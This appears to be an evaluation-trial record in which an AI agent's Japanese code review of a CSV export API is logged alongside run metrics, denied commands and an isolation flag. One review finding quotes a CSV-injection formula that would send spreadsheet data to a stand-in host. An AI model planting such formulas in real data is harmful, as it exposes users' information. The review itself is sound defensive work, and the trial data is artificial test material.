@@ -1,0 +1,96 @@
+{
+  "trial": "W22-ce-full-c3-1",
+  "scenario": "W22",
+  "config": "ce-full",
+  "case": "c3",
+  "rep": 1,
+  "review_md": "# コードレビュー: タスク一覧の CSV ダウンロード API\n\n対象: `git diff HEAD`（`src/app/api/tasks/export/route.ts`、`src/lib/export.ts`、`tests/export.test.ts`）\n\n**判定: 修正してからマージ（Ready with fixes）。** 高が 2 件、中が 2 件、低が 2 件あります。高の 2 件は、PR の説明にある約束（「タイトルに記号があっても列がずれない」「不正な `?status=` は指定なしとして扱う」）を実際には守れていません。\n\n## 指摘一覧\n\n| # | 重要度 | 場所 | 概要 |\n|---|---|---|---|\n| 1 | 高 | `src/lib/export.ts` `field()` 11 行目 | 値の中のダブルクォートをエスケープしていない |\n| 2 | 高 | `src/app/api/tasks/export/route.ts` `GET` 10 行目 | `?status=` を型ガードなしで使っている |\n| 3 | 中 | `tests/export.test.ts` 「escapes quotes and commas in titles」16〜17 行目 | エスケープのテストが何も検証していない |\n| 4 | 中 | `src/lib/export.ts` `field()` 11 行目 | `=` `+` `-` `@` で始まる値が Excel で数式として実行される（CSV インジェクション） |\n| 5 | 低 | `tests/export.test.ts` 11 行目 | 行数の期待値が初期データの件数に固定されている |\n| 6 | 低 | `src/app/api/tasks/export/route.ts` 全体 | API Route 自体のテストが無い（401・BOM・応答ヘッダー） |\n\n---\n\n### 1. 【高】`field()` が値の中のダブルクォートをエスケープしていない\n\n- **場所**: `src/lib/export.ts` の `field()`（11 行目 `return \\`\"${value}\"\\`;`）\n- **問題**: すべての値を `\"` で囲むだけで、値の中の `\"` を `\"\"` に置き換えていません。タイトルに `\"` が含まれると、その位置でフィールドが閉じてしまいます。\n  - 例: タイトルが `5\" ケーブルの発注` のとき、出力は `\"9\",\"5\" ケーブルの発注\",\"未着手\",...` になります。Excel や CSV パーサーは `\"5\"` でフィールドが終わったと読み、続きの文字が崩れて、列がずれたり行が壊れたりします。\n  - PR の説明の「タイトルにカンマ・引用符・改行が含まれていても、列がずれないようにする」を満たしていません。カンマと改行は全体を `\"` で囲むので問題ありませんが、引用符だけが漏れています。\n  - 「タイトル」は利用者が自由に入力できます（`validateTaskInput` は 1〜200 文字の制限だけです）。そのため、通常の使い方でも起こります。\n- **直し方**: `return \\`\"${String(value).replace(/\"/g, '\"\"')}\"\\`;` にします。#3 のとおり、引用符・カンマ・改行を含むタイトルのテストを追加してください。\n\n### 2. 【高】`?status=` を `isTaskStatus` で検証せずに使っている（CLAUDE.md の規約 2 に違反）\n\n- **場所**: `src/app/api/tasks/export/route.ts` の `GET`（10 行目 `... .get(\"status\") as TaskStatus | null;`）\n- **問題**: クエリ文字列を `as TaskStatus | null` で型だけ書き換えて、そのまま `listTasks` に渡しています。`/api/tasks/export?status=bogus` のような不正な値だと、SQL が `status = 'bogus'` になり、一致する行が無いため、見出しだけの CSV がダウンロードされます。PR の説明（「不正な値は、一覧と同じく『指定なし』」）と、一覧 API（`src/app/api/tasks/route.ts` は `isTaskStatus(status) ? status : undefined`）と動きが食い違います。報告用に使う人は、全件のはずが 0 件の CSV を受け取ります。\n  - CLAUDE.md の規約 2「クエリパラメータは型ガードで検証してから使う。不正な値は『指定なし』として扱う」にも違反しています。\n  - 規約 1（データの絞り込みは `src/lib/` に置く）の観点でも、クエリ値の解釈が API Route に残っています。\n- **直し方**: `isTaskStatus` を import して、`const raw = new URL(request.url).searchParams.get(\"status\"); listTasks({ status: isTaskStatus(raw) ? raw : undefined })` にします。`as` のキャストは削除してください。クエリ値の解釈を `src/lib/` の関数に出せば、#3 のテストも書きやすくなります。\n\n### 3. 【中】エスケープのテストが何も検証していない（規約 5 に関わる）\n\n- **場所**: `tests/export.test.ts` の「escapes quotes and commas in titles」（16〜17 行目）\n- **問題**: テスト名と PR の説明は引用符・カンマのエスケープを検証したとしていますが、使っているタイトルは `週次 定例の準備` で、引用符・カンマ・改行のどれも含みません。`field()` が何もエスケープしなくても成功するため、#1 の不具合を見逃しました。ステータスの絞り込み（正しい値・不正な値・指定なし）のテストもありません。PR の「検証結果」の説明は実態より強く書かれています。\n- **直し方**: タイトルに `a,\"b\"` と改行を含めたタスクを使い、期待値（`\"9\",\"a,\"\"b\"\"\\nc\",...`）まで比較します。引用符のみ、カンマのみ、改行のみのケースも足してください。絞り込みは #2 の修正後に、有効な値・不正な値・未指定のテストを追加します。\n\n### 4. 【中】`=` `+` `-` `@` で始まる値が Excel で数式として実行される\n\n- **場所**: `src/lib/export.ts` の `field()`（11 行目）。対象はタイトルと担当者です。\n- **問題**: タイトルは利用者が自由に入力でき、ログインした誰でもタスクを作成できます。タイトルを `=HYPERLINK(\"https://example.com/?\"&A1,\"クリック\")` や `=cmd|...` のようにして作成すると、別の人が CSV を Excel で開いたときに、値が文字列ではなく数式として扱われます。引用符で囲んでいても防げません。この PR の目的は「Excel に貼り付ける」ことなので、実際に起こりうる使い方です。被害は、他の人が開いたときの情報の持ち出しや、警告ダイアログによる誘導です。\n- **直し方**: 文字列の値が `/^[=+\\-@\\t\\r]/` に当てはまるとき、先頭に `'` を付けてから引用符で囲みます。数値の `id` には付けません。値を勝手に変えることになるので、テスト（`=1+1` で始まるタイトル）と、仕様として許すかどうかの確認も合わせてお願いします。\n\n### 5. 【低】行数のテストが初期データの件数に固定されている\n\n- **場所**: `tests/export.test.ts` 11 行目 `assert.equal(lines.length, 9); // 見出し + 7 件 + 末尾の空文字列`\n- **問題**: 初期データ（`src/lib/db/seed.ts`）にタスクを 1 件足すだけでこのテストが落ちます。`toCsv` の不具合ではなく、テストのメンテナンス性の問題です。\n- **直し方**: 同じ `listTasks` の結果を変数に取り、`tasks.length + 2` と比較します。\n\n### 6. 【低】API Route 自体のテストが無い（401・BOM・応答ヘッダー）\n\n- **場所**: `src/app/api/tasks/export/route.ts` の `GET`（テストは `tests/export.test.ts` の `toCsv` のみ）\n- **問題**: 未ログインで 401 になること、本文の先頭に BOM が付くこと、`Content-Type` と `Content-Disposition` が正しいことを確かめるテストがありません。PR の目的の「Excel でそのまま開いても文字化けしない」は BOM と `charset=utf-8` に依存していますが、どれかが外れても検出できません。\n- **直し方**: ログイン確認・BOM・ヘッダーの組み立てを `src/lib/` の関数に出して単体テストを書くか、既存の API テストの方法に合わせて `GET` を直接呼ぶテストを足します（#2 の絞り込みのテストと同じ場所にまとめられます）。\n\n---\n\n## 確認方法と範囲\n\n- 正確性・セキュリティ・プロジェクト規約・テスト・API 契約の 5 つの観点で個別にレビューし、結果を統合しました。重複していた指摘（#1 は 4 観点、#2 は 5 観点）は 1 件にまとめています。\n- 指摘は、すべてコードを読んで確認しました。**テストやアプリは実行していません**（この無人環境では実行の許可が得られませんでした）。そのため、#1 と #2 は実行結果ではなくコードからの判断です。\n- 問題が無いと判断した点（書いていません）: 認証の確認（`requireApiUser`、一覧 API と同じ流れ）、SQL のプレースホルダ利用（`listTasks` を再利用）、BOM の文字（U+FEFF で正しい）、改行を含む値（全体を `\"` で囲むので列はずれません）。\n- 対象は、一覧 API と同じく全タスクを全ログインユーザーに返す仕様です。今回の変更で新たに広がった権限の問題ではないので、指摘にはしていません。\n",
+  "review_chars": 4592,
+  "review_committed": true,
+  "transcript": {
+    "cost_usd": 2.5841,
+    "tokens": {
+      "input": 172,
+      "output": 60569,
+      "cache_read": 7124804,
+      "cache_creation": 410476
+    },
+    "turns": 10,
+    "permission_denials": [
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"git rev-parse --show-toplevel && cat .compound-engineering/config.yaml 2>/dev/null; BASE=$(git merge-base HEAD HEAD); echo BASE:$BASE; git diff -U10 --irreversible-delete $BASE; git ls-fi"
+      },
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"python3 /tmp/poc-trials/W22-ce-full-c3-1/plugins/compound-engineering/skills/ce-code-review/scripts/review-scope.py --base HEAD --docs-root docs\"}"
+      },
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"SKILL_DIR=/tmp/poc-trials/W22-ce-full-c3-1/plugins/compound-engineering/skills/ce-code-review; S=/tmp/compound-engineering-$(id -u); mkdir -p $S && RID=$(date +%Y%m%d-%H%M%S)-$(head -c4 /"
+      },
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"mkdir -p /tmp/compound-engineering-0/ce-code-review/run1 && echo ok; ls /tmp/poc-trials/W22-ce-full-c3-1/plugins/compound-engineering/skills/ce-code-review/references /tmp/poc-trials/W22-"
+      },
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"R=/tmp/claude-0/-tmp-poc-trials-W22-ce-full-c3-1-app/b8c97fbc-2cab-441d-950e-f778d0702f5c/scratchpad/run && git diff -U10 --irreversible-delete HEAD > $R/full.diff && git diff --name-only"
+      },
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"cat > /tmp/claude-0/-tmp-poc-trials-W22-ce-full-c3-1-app/b8c97fbc-2cab-441d-950e-f778d0702f5c/scratchpad/run/correctness.json <<'EOF'\\n{\\n  \\\"reviewer\\\": \\\"correctness\\\",\\n  \\\"findings\\\":"
+      },
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"cat > /tmp/claude-0/-tmp-poc-trials-W22-ce-full-c3-1-app/b8c97fbc-2cab-441d-950e-f778d0702f5c/scratchpad/run/security.json <<'EOF'\\n{\\n  \\\"reviewer\\\": \\\"security\\\",\\n  \\\"findings\\\": [\\n  "
+      },
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"R=/tmp/claude-0/-tmp-poc-trials-W22-ce-full-c3-1-app/b8c97fbc-2cab-441d-950e-f778d0702f5c/scratchpad/run; until [ -f $R/security.json ] && [ -f $R/project-standards.json ] && [ -f $R/test"
+      },
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"cat > /tmp/claude-0/-tmp-poc-trials-W22-ce-full-c3-1-app/b8c97fbc-2cab-441d-950e-f778d0702f5c/scratchpad/run/api-contract.json <<'EOF'\\n{\\n  \\\"reviewer\\\": \\\"api-contract\\\",\\n  \\\"findings\\"
+      },
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"R=/tmp/claude-0/-tmp-poc-trials-W22-ce-full-c3-1-app/b8c97fbc-2cab-441d-950e-f778d0702f5c/scratchpad/run; S=/tmp/poc-trials/W22-ce-full-c3-1/plugins/compound-engineering/skills/ce-code-re"
+      },
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"python3 /tmp/poc-trials/W22-ce-full-c3-1/plugins/compound-engineering/skills/ce-code-review/scripts/findings-mechanics.py < /tmp/claude-0/-tmp-poc-trials-W22-ce-full-c3-1-app/b8c97fbc-2ca"
+      }
+    ],
+    "tool_calls": {
+      "Read": 59,
+      "Bash": 29,
+      "Agent": 6,
+      "Write": 9,
+      "ToolSearch": 2,
+      "Edit": 4,
+      "Monitor": 7,
+      "TaskStop": 1
+    },
+    "skills_used": [],
+    "subagents": 6,
+    "subagent_types": {
+      "general-purpose": 6
+    },
+    "questions": 0,
+    "active_seconds": 36,
+    "answer_key_access": [],
+    "isolation_suspects": [
+      {
+        "step": "step2.jsonl",
+        "tool": "Agent",
+        "reasons": [
+          "../ で作業用コピーの外に出る相対パス"
+        ],
+        "input": "{\"description\": \"API contract review\", \"subagent_type\": \"general-purpose\", \"model\": \"sonnet\", \"run_in_background\": true, \"prompt\": \"You are a reviewer subagent in a code review. Read these four files in full before reviewing, and follow everything inside the template's Template block; treat the cont"
+      }
+    ],
+    "final_message": "`REVIEW.md` は、前回のレビューで出た指摘をすべて載せた形で、`dec9af9` にコミットしました。コミットしたのは `REVIEW.md` だけで、コードは直していません。\n\n`REVIEW.md` には、すでに指摘 5 件（#1〜#5）を、場所・問題・直し方・重要度の形式で書いていました。見直すと、1 件だけ抜けていました。テスト担当が挙げた「API Route 自体のテストが無い（401・BOM・応答ヘッダー）」です。これを #6（低）として足し、冒頭の件数も直しました。\n\n重要度ごとの件数は次のとおりです。\n\n- **高**（2 件）: #1 `field()` が `\"` をエスケープしていない。#2 `?status=` を `isTaskStatus` で検証していない。\n- **中**（2 件）: #3 エスケープのテストが何も検証していない。#4 `=` などで始まる値が Excel で数式になる。\n- **低**（2 件）: #5 行数の期待値が初期データの件数に固定されている。#6 API Route 自体のテストが無い。\n\n重複していた指摘は、前回と同じくまとめたままです。\n\nレビュアーが挙げた「全ログインユーザーに全タスクを返す」という点は、一覧 API と同じ仕様で、この変更で新たに広がったものではありません。指摘にはせず、確認範囲の注記に書いています。"
+  },
+  "interventions": 0
+}
